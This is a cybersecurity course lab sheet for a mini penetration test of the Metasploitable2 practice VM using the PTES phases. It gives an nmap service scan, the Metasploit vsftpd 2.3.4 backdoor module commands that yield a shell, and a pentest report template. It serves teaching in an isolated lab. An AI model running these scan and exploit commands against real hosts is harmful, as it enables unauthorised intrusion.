# Day 61 - Lab: Penetration Testing

## Objective
Run a full mini-pentest against Metasploitable2 in your isolated lab, following the PTES phases.

## Task 1: Reconnaissance
```bash
nmap -sV -sC 192.168.x.x   # replace with Metasploitable2 IP
```
Document: open ports, services, versions found.

## Task 2: Vulnerability Analysis
Cross-reference nmap output with known CVEs (search nvd.nist.gov for service versions found).

## Task 3: Exploitation with Metasploit
```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.x.x
run
```
If successful, you get a shell - document the access level gained.

## Task 4: Write a Pentest Report
Using your findings, write a structured report with:
- Executive Summary
- Finding: vsftpd backdoor (or whatever you found)
- Steps to reproduce
- Impact
- Remediation recommendation

## Results
| Item | Value |
|---|---|
| Nmap scan completed (Y/N) | |
| Vulnerability identified (Y/N) | |
| Exploitation successful (Y/N) | |
| Pentest report written (Y/N) | |

## Lab Summary
Note how the formal PTES structure helped organize your approach versus ad-hoc testing.
